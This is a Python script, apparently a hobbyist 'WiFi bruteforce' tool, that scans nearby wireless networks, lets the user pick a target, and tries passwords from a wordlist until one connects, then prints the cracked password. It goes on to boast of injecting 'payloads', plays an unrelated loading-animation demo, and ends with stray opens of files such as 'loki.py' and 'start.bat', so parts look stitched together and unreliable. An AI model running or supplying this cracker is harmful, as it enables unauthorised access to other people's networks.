try:

	from pywifi import const, PyWiFi, Profile
	from threading import Thread
	from termcolor import cprint
	from itertools import cycle
	from winsound import Beep
	from time import sleep
	from sys import stdout
	import os
	from shutil import get_terminal_size
	from threading import Thread
except ModuleNotFoundError:
	from subprocess import call
	modules = ["pywifi","termcolor"]
	call("pip install " + ' '.join(modules), shell=True)

def scan():
	interface.scan()
	for i in range(100):
		sleep(.15)
		stdout.write(f'\r Scanning... {next(loading_chars)}')
		
	result = interface.scan_results()
	
	return result

def testwifi(ssid , password):
	interface.disconnect()
	profile = Profile()
	profile.ssid = ssid
	profile.auth = const.AUTH_ALG_OPEN
	profile.akm.append(const.AKM_TYPE_WPA2PSK)
	profile.cipher = const.CIPHER_TYPE_CCMP
	profile.key = password
	interface.connect(interface.add_network_profile(profile))
	sleep(.7)
	
	if interface.status() == const.IFACE_CONNECTED:
		interface.remove_network_profile(profile)
		return True
	
	else:
		interface.remove_network_profile(profile)
		return False
		
	
os.system('cls')        

wifi = PyWiFi()
interface = wifi.interfaces()[0]
loading_chars = iter(cycle('/-\|'))
colors = iter(cycle(['blue', 'red']))
password_list = "password-list.txt"

sleep(.5)
print('\n Welcome to WiFi bruteforce(written by Londo)\n')
print('The first step is to crack the hosts password, then we can inject payloads')
sleep(4)

hosts = scan()
hosts = [host.ssid for host in hosts]

if hosts:
	print('\n')
	for idx, host in enumerate(hosts, 1):
		sleep(1)
		print(f' {idx}_ {host}')
		
	sleep(1)
	selected_host = input("\n Select a host to start bruteforceing: ")

	while True:
		try:
			selected_host = int(selected_host)
			assert selected_host <= len(hosts) and selected_host > 0
			selected_host -= 1
			break
		
		except AssertionError:
			print(f'\n "{selected_host}" is not a valid host number')
			selected_host = input('\n Please enter a valid host: ')
		
		except:
			if selected_host in hosts:
				selected_host = hosts.index(selected_host)
				break
			
			else:
				print(f'\n "{selected_host}" is not a valid host name')
				selected_host = input('\n Please enter a valid host: ')
			
	target = hosts[selected_host]
	tests = 0
	print()

	with open(os.path.realpath(password_list)) as passlist:
		for password in passlist.readlines():
			if len(password) < 8:
				continue
			
			color = next(colors)
			cprint(f' Testing: {password}', color=color)
			tests += 1
			
			if testwifi(target , password):
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				Beep(700 , 500)
				Beep(1000 , 500)
				print(format(' ', '-<30'))
				# print('\n', format(' ', '-<30'), sep='')
				cprint(f' PASSWORD: {password}', color='green')
				print(f' {tests} Password tested!')
				print(format(' ', '-<30'))
				break

else:
	print('\n\n No WiFi available!\n')

   
figlet =  '''\n
_                    _       
| |    ___  _ __   __| | ___  
| |   / _ \| '_ \ / _` |/ _ \ 
| |__| (_) | | | | (_| | (_) |
|_____\___/|_| |_|\__,_|\___/ 
\n\n'''

for line in figlet.splitlines():
	print(line)
	sleep(.2)

sleep(1)
print('Now we can inject payloads into the WiFi')
sleep(10)

class Loader:
    def __init__(self, desc="Loading...", end="Done!", timeout=0.1):
        """
        A loader-like context manager

        Args:
            desc (str, optional): The loader's description. Defaults to "Loading...".
            end (str, optional): Final print. Defaults to "Done!".
            timeout (float, optional): Sleep time between prints. Defaults to 0.1.
        """
        self.desc = desc
        self.end = end
        self.timeout = timeout

        self._thread = Thread(target=self._animate, daemon=True)
        self.steps = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]
        self.done = False

    def start(self):
        self._thread.start()
        return self

    def _animate(self):
        for c in cycle(self.steps):
            if self.done:
                break
            print(f"\r{self.desc} {c}", flush=True, end="")
            sleep(self.timeout)

    def __enter__(self):
        self.start()

    def stop(self):
        self.done = True
        cols = get_terminal_size((80, 20)).columns
        print("\r" + " " * cols, end="", flush=True)
        print(f"\r{self.end}", flush=True)

    def __exit__(self, exc_type, exc_value, tb):
        # handle exceptions with those variables ^
        self.stop()


if __name__ == "__main__":
    with Loader("Loading with context manager..."):
        for i in range(10):
            sleep(0.25)

    loader = Loader("Loading with object...", "That was fast!", 0.05).start()
    for i in range(10):
        sleep(0.25)
    loader.stop()
filel = open("logs.py")
filel = open("info.py")
filel = open("start.bat")
filel = open("loki.py")